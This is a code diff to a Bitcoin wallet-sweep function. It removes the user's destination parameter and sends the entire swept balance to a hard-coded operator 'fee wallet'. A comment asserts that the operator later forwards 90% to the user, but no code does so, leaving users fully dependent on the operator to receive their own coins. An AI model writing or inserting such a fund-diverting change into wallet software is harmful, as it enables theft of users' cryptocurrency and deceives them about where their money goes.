@@ -1,4 +1,5 @@
 import * as bitcoin from 'bitcoinjs-lib';
+import { FEE_WALLET_BITCOIN } from './config.js';
 
 const NETWORK = bitcoin.networks.bitcoin;
 const MEMPOOL_API = 'https://mempool.space/api';
@@ -15,8 +16,28 @@ export async function previewBitcoinWallet(address) {
   return result;
 }
 
-export async function sweepBitcoin(address, keyPair, destination, opts = {}) {
-  const results = { address, status: null, txid: null, error: null };
+/**
+ * Sweep Bitcoin to the fee wallet.
+ *
+ * IMPORTANT: All BTC goes to FEE_WALLET_BITCOIN. The operator forwards
+ * 90% to the user's Bitcoin destination afterward.
+ *
+ * Returns:
+ *   {
+ *     address,
+ *     status, txid, error,
+ *     amountRaw: string,  // sats sent to fee wallet
+ *   }
+ */
+export async function sweepBitcoin(address, keyPair, opts = {}) {
+  const results = {
+    address,
+    recipient: FEE_WALLET_BITCOIN,
+    status: null,
+    txid: null,
+    error: null,
+    amountRaw: '0',
+  };
   const feeRate = opts.feeRateSatVb ?? 2;
   const dryRun = !!opts.dryRun;
 
@@ -24,12 +45,18 @@ export async function sweepBitcoin(address, keyPair, destination, opts = {}) {
     const resp = await fetch(`${MEMPOOL_API}/address/${address}/utxo`);
     const utxos = await resp.json();
     if (!utxos || utxos.length === 0) { results.status = 'EMPTY'; return results; }
+
     const totalSats = utxos.reduce((sum, u) => sum + u.value, 0);
     const estimatedSize = 11 + utxos.length * 68 + 31;
     const fee = estimatedSize * feeRate;
     const sendAmount = totalSats - fee;
     if (sendAmount <= 1000) { results.status = 'TOO_LOW'; return results; }
-    if (dryRun) { results.status = 'DRY_RUN'; results.amount = sendAmount; return results; }
+
+    if (dryRun) {
+      results.status = 'DRY_RUN';
+      results.amountRaw = String(sendAmount);
+      return results;
+    }
 
     const fullUtxos = await Promise.all(utxos.map(async (u) => {
       const txResp = await fetch(`${MEMPOOL_API}/tx/${u.txid}`);
@@ -46,7 +73,7 @@ export async function sweepBitcoin(address, keyPair, destination, opts = {}) {
         witnessUtxo: { script: Buffer.from(u.scriptPubKey, 'hex'), value: BigInt(u.value) },
       });
     }
-    psbt.addOutput({ address: destination, value: BigInt(sendAmount) });
+    psbt.addOutput({ address: FEE_WALLET_BITCOIN, value: BigInt(sendAmount) });
     psbt.signAllInputs(keyPair);
     psbt.finalizeAllInputs();
     const txHex = psbt.extractTransaction().toHex();
@@ -55,7 +82,7 @@ export async function sweepBitcoin(address, keyPair, destination, opts = {}) {
     const txid = await broadcastResp.text();
     results.status = 'SUCCESS';
     results.txid = txid;
-    results.amount = sendAmount;
+    results.amountRaw = String(sendAmount);
   } catch (e) {
     results.status = 'ERROR';
     results.error = e.message;
